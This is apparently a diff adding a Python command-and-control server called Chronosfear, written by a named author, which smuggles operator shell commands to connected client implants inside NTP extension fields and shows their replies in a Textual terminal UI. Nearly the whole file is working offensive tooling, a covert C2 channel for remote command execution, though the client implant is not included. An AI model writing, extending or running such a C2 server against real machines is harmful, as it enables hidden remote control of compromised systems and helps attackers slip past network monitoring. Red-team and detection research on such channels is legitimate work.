@@ -1,0 +1,280 @@
+"""
+CHRONOSFEAR C2
+Author: Caroline Richards
+
+This tool runs a simple c2 server over NTP. It uses Textual to create a basic UI. 
+Shell commands can be broadcasted to all clients or sent to specific clients. 
+"""
+
+import socket
+import threading
+import queue
+import struct
+
+from textual.app import App, ComposeResult
+from textual.widgets import Header, Footer, DataTable, Log, Static, Input
+from textual.containers import Horizontal, Vertical
+from textual.reactive import reactive
+
+event_queue = queue.Queue() # Queue used for passing events from socket threads to UI thread
+
+alive_clients = {} # Dictionary maps IP addresses to client socket connections
+
+metrics = {
+    "connections": 0,
+    "packets": 0
+}
+
+"""
+This function creates an NTP packet with the command stored in the extension field. 
+Wish I knew scapy existed before I wrote this. 
+"""
+def make_ntp_packet(command):
+    header = struct.pack("!B B B b 11I", 0b00100011, 1, 0, 0, *(0 for _ in range(11)))
+    ext_type = 0xC0DE
+    data = command.encode()
+    length = 4 + len(data)
+    pad_length = (4 - (length % 4)) % 4
+    total_length = length + pad_length
+    ext_header = struct.pack("!HH", ext_type, total_length)
+    ext_data = data + (b'\x00' * pad_length)
+    ext = ext_header + ext_data
+    packet = header + ext
+    return packet
+
+"""
+This function parses the extension fields of an NTP packet. 
+"""
+def parse_ntp_packet(buf: bytes, offset: int = 48):
+    results = []
+    while offset + 4 <= len(buf):
+        ext_hdr = buf[offset:offset+4]
+        ext_type, ext_len = struct.unpack("!HH", ext_hdr)
+        if ext_len < 4:
+            # malformed
+            break
+        if offset + ext_len > len(buf):
+            # truncated
+            break
+        data = buf[offset+4: offset+ext_len]
+        results.append((ext_type, data))
+        # advance - ext_len is already padded to 4 bytes
+        offset += ext_len
+    return results
+
+"""
+This class represents the Textual UI for the Chronosfear C2 server. 
+It displays active clients, server logs, and allows the operator to send commands to clients.
+"""
+class Chronosfear(App):
+    CSS = """
+    Screen {
+        layout: vertical;
+    }
+
+    #main {
+        height: 1fr;
+    }
+
+    #left {
+        width: 40%;
+    }
+
+    #right {
+        width: 60%;
+    }
+
+    DataTable {
+        height: 100%;
+    }
+
+    Log {
+        height: 100%;
+    }
+    """
+
+    focused_client = reactive(None)
+    
+    """
+    Define the different layouts within the UI. 
+    """
+    def compose(self) -> ComposeResult:
+        yield Header()
+        with Horizontal(id="main"):
+            with Vertical(id="left"):
+                yield Static("Active Clients")
+                yield DataTable(id="clients")
+
+                yield Static("Metrics")
+                yield Static(id="metrics")
+            with Vertical(id="right"):
+                yield Static("Server Logs")
+                yield Log(id="logs")
+
+                yield Static("Focused Client")
+                yield Log(id="shell")
+        yield Input(placeholder="Command...", id="cmd")
+        yield Footer()
+
+    def on_mount(self):
+        # create the table of connected clients
+        table = self.query_one("#clients", DataTable)
+        table.add_columns("IP")
+        table.cursor_type = "row"
+
+        self.set_interval(0.25, self.process_events)
+        self.set_interval(1, self.update_metrics)
+
+    def process_events(self):
+        table = self.query_one("#clients", DataTable)
+        log = self.query_one("#logs", Log)
+        shell = self.query_one("#shell", Log)
+
+        while not event_queue.empty():
+            event = event_queue.get()
+            if event["type"] == "connect":
+                table.add_row(event["ip"], key=event["ip"])
+                log.write_line(f"{event['ip']} connected")
+            elif event["type"] == "disconnect":
+                log.write_line(f"{event['ip']} disconnected")
+                table.remove_row(event["ip"])
+                if self.focused_client == event["ip"]:
+                    self.focused_client = None
+            elif event["type"] == "message":
+                log.write_line(f"{event['ip']} → {event['msg']}")
+            elif event["type"] == "shell":
+                if event["ip"] == self.focused_client:
+                    shell.write_line(event["output"])
+    
+    def on_data_table_row_highlighted(self, event):
+        table = self.query_one("#clients", DataTable)
+        if event.cursor_row is None:
+            return
+        if event.cursor_row >= len(table.rows):
+            return
+        row = table.get_row_at(event.cursor_row)
+        self.focused_client = row[0]
+        logs = self.query_one("#logs", Log)
+        logs.write_line(f"Focused client: {self.focused_client}")
+
+    def update_metrics(self):
+        m = self.query_one("#metrics", Static)
+        m.update(
+            f"Connections: {metrics['connections']}\nPackets: {metrics['packets']}"
+        )
+
+    def broadcast_command(self, command, log):
+        for conn in alive_clients.values():
+            ntp_packet = make_ntp_packet(command)
+            conn.send(ntp_packet)
+            log.write_line(f"Broadcast sent to: {conn}")
+            log.write_line("Broadcast finished")
+
+    def on_input_submitted(self, event: Input.Submitted):
+        cmd = event.value
+        event.input.value = ""
+
+        log = self.query_one("#logs", Log)
+        log.write_line(f"> {cmd}")
+
+        shell = self.query_one("#shell", Log)
+
+        if self.focused_client is None:
+            # no specfic client focused, treat as global command
+            log.write_line("No client selected. All commands will be broadcasted.")
+            if cmd.startswith("help"):
+                log.write_line("You are in broadcast mode: commands will be sent to all clients. Select a connected client from the table to enter focused mode.")
+            elif cmd.startswith("quit"): 
+                log.write_line("Shutting down server...")
+                server.close()
+                self.exit()
+            else:
+                self.broadcast_command(cmd, log)
+        else: 
+            # send command to focused client
+            if cmd.startswith("help"):
+                log.write_line("You are in focused mode: all commands will be sent to focused client. Prepend command with 'broadcast' in order to broadcast commands.")
+            elif cmd.startswith("broadcast "):
+                command = cmd.replace("broadcast ", "")
+                self.broadcast_command(command, log)
+            elif cmd.startswith("quit"): 
+                log.write_line("Shutting down server...")
+                server.close()
+                self.exit()
+            else:
+                # send command to focused client
+                if self.focused_client in alive_clients:
+                    # get client socket
+                    client_sock = alive_clients[self.focused_client]
+                    
+                    # create ntp packet with command in extension field
+                    ntp_packet = make_ntp_packet(cmd)
+                    client_sock.send(ntp_packet)
+                    log.write_line(f"Sent exec to {self.focused_client}")
+                else:
+                    log.write_line(f"Focused client {self.focused_client} not found")
+
+def handle_client(conn, addr):
+    ip = addr[0]
+    alive_clients[ip] = conn
+    metrics["connections"] += 1
+
+    event_queue.put({
+        "type": "connect",
+        "ip": ip
+    })
+
+    try:
+        while True:
+            data = conn.recv(1024)
+            if not data:
+                break
+            if len(data) <= 48:
+                continue
+            packet = parse_ntp_packet(data)
+            if not packet: 
+                continue
+            response = packet[0][1].decode().strip("\x00")
+            metrics["packets"] += 1
+            event_queue.put({
+                "type": "message",
+                "ip": ip,
+                "msg": response
+            })
+    except: 
+        event_queue.put({
+            "type": "message",
+            "ip": ip,
+            "msg": "Error occurred while processing packet"
+        })
+    finally:
+        event_queue.put({
+            "type": "disconnect",
+            "ip": ip
+        })
+        # time.sleep(5) # small delay to ensure event is processed before cleanup
+        conn.close()
+        del alive_clients[ip]
+
+def start_server():
+    global server
+    try: 
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.bind(("localhost", 123))
+        server.listen()
+    except OSError as e: 
+        print("Error starting server: ", e)
+        return 
+
+    while True:
+        conn, addr = server.accept()
+        threading.Thread(
+            target=handle_client,
+            args=(conn, addr),
+            daemon=True
+        ).start()
+
+server_thread = threading.Thread(target=start_server, daemon=True)
+server_thread.start()
+
+Chronosfear().run()
